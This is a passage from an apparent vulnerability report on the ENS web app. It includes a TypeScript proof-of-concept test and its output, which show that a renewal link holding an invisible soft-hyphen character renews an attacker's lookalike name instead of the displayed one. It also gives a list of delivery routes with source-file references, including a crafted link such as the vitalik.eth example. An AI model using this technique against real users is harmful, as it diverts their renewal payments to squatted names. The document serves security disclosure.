  if (result.isErr()) throw result.error
  const txId = result.value
  console.log('\nsubmitRenewActor returned txId', txId)

  const settled = await waitForTransaction(txId)
  console.log('transaction settled (transaction-manager reported success above)')
  void settled
  const archivedTx = archived.find((a) => a.txId === txId)
  console.log('submitted to      :', (archivedTx?.request as { to?: string })?.to)
  console.log('submitted calldata:', (archivedTx?.request as { data?: string })?.data)
  console.log('tx hash           :', archivedTx?.hash)
  off()

  const afterGate = await read(gate.label)
  const afterTx = await read(loaderLabel)
  console.log('\nAFTER   gate', gate.name, afterGate, 'delta', (afterGate - beforeGate).toString())
  console.log('        tx  ', `${loaderLabel}.eth`, afterTx, 'delta', (afterTx - beforeTx).toString())
})
```

Actual output:

```
URL param        : "pocvict­im.eth"
loader label (tx): "pocvict­im"
gate name        : "pocvictim.eth"
BEFORE  gate pocvictim.eth 1789841291n | tx pocvict­im.eth 1789841415n

submitRenewActor returned txId poc-renew
[TRANSACTION MANAGER] Transaction poc-renew state: pending
[TRANSACTION MANAGER] Transaction poc-renew state: success
submitted to      : 0xa88553F454b77203B0D036A05c894d555EAAa2Cc
submitted calldata: 0x89d779c3...0b706f6376696374c2ad696d000000000000000000000000000000000000000000
tx hash           : 0xee7298c2b6a563791f95c2331d6298144130c1b677ca61c8919ad2f17980a394

AFTER   gate pocvictim.eth 1789841291n delta 0
        tx   pocvict­im.eth 1821377415n delta 31536000
```

`0x89d779c3` is `renew(string,uint64,address,bytes32)` and the trailing `0b 706f6376696374c2ad696d` is the length-11 label `pocvict<C2 AD>im`. The transaction manager reports `success`, the attacker's registration gains a year, and the name whose expiry the page proved and displayed gains nothing.

***

## Attack delivery

1. Link. `https://app.ens.domains/renew/vita%C2%ADlik.eth` is a normal-looking renewal link; the payload is one invisible character.
2. Paste. ENS names travel as text. `parseSearchInput` (`features/navigation/Header/search/searchSuggestions.utils.ts:54`) and `normalizeQuery` (`features/shared/registration/nameUtils.ts:31-35`) apply only `trim().toLowerCase()`, so a pasted lookalike survives the search bar. `features/navigation/Header/search/SuggestionItem.tsx:25-34` links to `/$name` and `/register/$name` with the raw string, and the profile page's Renew button then carries it into `/renew/$name` (`RenewNameButton.tsx:42`).
3. In-app, with no attacker link at all. The expiry notification's Renew button carries the payload name verbatim: `features/notifications/notifications/name-expiry.tsx:35-38` `params={{ name: payload.name }} to="/renew/$name"`. `features/dashboard/service/mutations/addFavorite.ts:18-20` stores the raw name, so one favorite click on a poisoned page makes the victim's own dashboard and their own expiry notifications serve the squat from then on. `RenewNameButton.tsx:42` links to `/renew/$name` with whatever name the surrounding view holds.

***
